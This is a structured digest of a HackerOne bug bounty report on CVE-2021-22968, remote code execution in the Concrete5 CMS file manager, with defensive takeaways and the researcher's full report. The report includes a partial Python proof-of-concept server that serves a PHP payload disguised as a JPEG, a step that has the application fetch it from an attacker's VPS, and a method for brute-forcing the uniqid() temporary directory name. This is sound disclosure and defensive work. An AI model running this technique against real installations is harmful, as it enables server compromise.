# Remote Code Execution via Remote File Upload Bypass in Concrete5 File Manager

## Metadata
- **Source:** HackerOne
- **Report:** 1350444 | https://hackerone.com/reports/1350444
- **Submitted:** 2021-09-24
- **Reporter:** byc_404
- **Program:** Concrete5 CMS
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Arbitrary File Upload, Weak Randomization, Execution Time Logic Flaw, Remote Code Execution
- **CVEs:** CVE-2021-22968
- **Category:** memory-binary

## Summary
Concrete5's file manager allows administrators to download remote files, but the implementation contains multiple flaws enabling RCE. By supplying multiple slow-responding URLs, an attacker can delay script execution to prevent cleanup of a temporary directory, then brute-force the predictable directory name (generated via uniqid()) to access uploaded PHP files.

## Attack scenario
1. Attacker gains administrator privileges (social engineering, credential compromise, or insider threat)
2. Attacker sets up malicious HTTP server hosting both a PHP webshell and slow-responding endpoints
3. Attacker submits multiple URLs to file manager: one pointing to malicious PHP, others to sleep endpoints
4. Application downloads files in loop but delays cleanup due to slow HTTP responses exceeding 120-second timeout
5. Attacker extracts timestamp from uniqid() directory name and brute-forces remaining 5 hex characters
6. Attacker accesses exposed PHP webshell via direct URL to execute arbitrary code on server

## Root cause
Three compounding vulnerabilities: (1) VolatileDirectory uses predictable uniqid() where first 8 chars encode UTC timestamp, (2) no file extension validation to block executable types, (3) cleanup via __destruct() doesn't trigger until foreach loop completes, allowing timeout manipulation to prevent deletion.

## Attacker mindset
An insider or compromised admin seeking persistent code execution. The attack is sophisticated but requires admin access. The attacker exploits framework design assumptions: that execution completes quickly and that temporary directories are actually temporary. The uniqid() weakness shows incomplete threat modeling around information disclosure.

## Defensive takeaways
- Implement strict file extension whitelisting; reject .php, .phtml, .php3-7, .pht files regardless of MIME type
- Replace uniqid() with cryptographically secure randomization (random_bytes + bin2hex or similar)
- Store uploaded files outside web-accessible directories or use file serving mechanism with MIME-type enforcement
- Set strict timeout limits on individual file downloads rather than entire operation
- Implement cleanup via background job/cron instead of relying on __destruct()
- Log and alert on admin file upload operations, especially remote URLs
- Consider requiring MIME type validation of actual file content, not just headers
- Restrict remote file download feature to whitelisted domains/protocols

## Variant hunting
Check other Concrete5 versions for identical uniqid() usage in VolatileDirectory
Audit all temporary directory creation patterns across framework for predictable naming
Review other file import mechanisms that may have similar timeout/cleanup race conditions
Examine whether non-admin users can trigger file operations with longer execution times
Investigate if VolatileDirectory is used elsewhere with weaker access controls
Check if MIME type validation can be bypassed (e.g., polyglot files, double extension tricks)

## MITRE ATT&CK
- T1190
- T1505.003
- T1566.002
- T1078.002
- T1083
- T1204.001

## Notes
Requires admin privileges, significantly reducing real-world impact but increasing severity given insider threat potential. The uniqid() predictability is a well-known weakness (CVE-2013-5952 and similar cases). The execution timeout manipulation is creative. Report lacks bounty amount and response timeline. Code analysis clearly demonstrates the vulnerability, making reproduction straightforward. Proof-of-concept is well-documented with working exploit code.

## Full report
<details><summary>Expand</summary>

Hi, I 'm currently testing the latest concretecms on my own pc and found some security problems of file manager.
Concretecms allows user to upload remote files via file manager.  With some techniques to bypass restriction  of this function, a evil user will be able to download arbitary php file into accessible file folder. Since the folder name is generated with `uniqid()`, bruteforcing 5-digits hex code can leads to the correct directory where our php file lies. Then you can just visit it to get RCE.

Privileges required: Administrator
Magic word for submitting the report: crayons

## Reproduce

* Login as a user with Administrator privileges.
* set up evil server: run `python3 server.py` on your remote VPS server. Here my python server is listening  at port 8877.

{F1459853}
* add following urls：The top evil link is to our webshell file `http://YOUR_VPS_IP:8877/byc.php`, following  multiple`http://YOUR_VPS_IP:8877/stuck` links( 20+ can assure the execution time).
{F1459871}

* wait 120 seconds for this process to send error. You can also see the log on your server.

{F1459875}

{F1459878}

* Check your website folder and find that the evil php script stays in a temp folder. You can directly access this file from browser.

(Although this directory name seems random, the name of it is actually generated by `uniqid()` with total length 13. The first 8 characters are actually the UTC timestamp of the time when you send request. So you can bruteforce the last 5 characters and access the exact folder where our file lies.)

{F1459887}

{F1459884}

## Code analysis

The source code below in `concrete/controllers/backend/file.php` shows the main logic of my exploit. The server takes multiple urls as input, validate each of them and then download it.The error during this process will be  collected and send in response at last. 
```php
            $this->checkRemoteURlsToImport($urls);
            $originalPage = $this->getImportOriginalPage();
            $fi = $this->app->make(Importer::class);
            $volatileDirectory = $this->app->make(VolatileDirectory::class);
            foreach ($urls as $url) {
                try {
                    $downloadedFile = $this->downloadRemoteURL($url, $volatileDirectory->getPath());
                    $fileVersion = $fi->import($downloadedFile, false, $replacingFile ?: $this->getDestinationFolder());
                    if (!$fileVersion instanceof FileVersionEntity) {
                        $errors->add($url . ': ' . $fi->getErrorMessage($fileVersion));
                    } else {
                        if ($originalPage !== null) {
                            $fileVersion->getFile()->setOriginalPage($originalPage->getCollectionID());
                        }
                        $importedFileVersions[] = $fileVersion;
                    }
                } catch (UserMessageException $x) {
                    $errors->add($x);
                }
            }
```
The `downloadRemoteURL` function somehow allows url path like `/byc.php`. So php file will be written into directory.

{F1460016}

However, the directory will be deleted by the `__destruct` function of `VolatileDirectory`, it seems impossible to race condition and access our php file before deleted.

{F1459990}

So as long as we trigger an error before `__destruct` is called, we can keep our php file in that temp directory with  enough time to bruteforce.

My idea is that, since the server has an execution time limit  of 120s. We can just submit enough urls since the function won't throw an error until all the urls are processed, that's why I use python server to sleep 10 second each time it visit `/stuck` in my poc.
```python
EXPLOIT="<?php phpinfo(); "
class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'Current time: {datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")}')
        self.send_response(200)
        self.send_header("Content-type", "image/jpeg")
        self.end_headers()
        self.wfile.write(EXPLOIT.encode('utf-8'))
        if self.path == "/stuck":
            time.sleep(10)
```

So that's how I bypass the limit and successfully write a file into folder.

## Possible Fix Method

* Disallow php file extension when writing it , although it will be deleted soon
* do not use  `uniqid` to create directory under `/temp` cause most chars of it can be deduced by the current time. Use `md5(uniqid())` will make this exploit unable to bruteforce.

eg.
As it is shown above, the directory of my evil file lies is `volatile-0-614daecb71435`. Take the first 8 chars `614daecb` and execute python code:

```python
print(datetime.datetime.fromtimestamp(int('0x614daecb', 16), tz=datetime.timezone.utc))
#result: 2021-09-24 10:56:11+00:00
```
And you can check out the time when my server receives the first request: `2021-09-24 10:56:12` which is 1 second after the directory creates.
So user can easily get the time when directory creates. 

Concluding, anyone get access to admin user will be able to write arbitary files into brute-forceable directory which leads to Remote Code Execution.

Thanks,
 
Best regards.

## Impact

Remote Code Execution

</details>

---
*Analysed by Claude on 2026-05-12*
